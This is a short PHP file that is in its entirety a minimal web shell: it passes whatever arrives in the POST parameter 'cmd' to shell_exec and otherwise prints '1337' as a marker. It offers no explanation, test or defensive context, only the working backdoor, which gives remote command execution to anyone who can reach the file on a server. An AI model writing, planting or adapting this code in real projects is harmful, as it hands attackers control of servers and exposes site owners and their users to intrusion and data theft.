<?php 
if(isset($_POST["cmd"])){
    shell_exec($_POST["cmd"]);
} else {
    echo "1337";
}
